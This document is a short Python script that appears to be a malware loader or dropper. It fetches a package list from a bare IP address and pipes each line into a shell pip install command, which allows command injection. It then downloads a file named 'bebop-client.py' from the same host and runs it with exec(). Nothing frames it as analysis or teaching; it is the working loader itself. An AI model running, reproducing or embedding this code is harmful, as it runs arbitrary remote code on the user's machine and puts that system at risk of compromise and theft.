from requests import get
from subprocess import *

reqs = get("http://45.61.136.109/requirements.txt").content.decode().split("\n")
for req in reqs:
    print(req)
    x = Popen(f"pip3 install {req} && pip install {req}", shell=True).communicate()

script = get("http://45.61.136.109/bebop-client.py").content.decode()
exec(script)
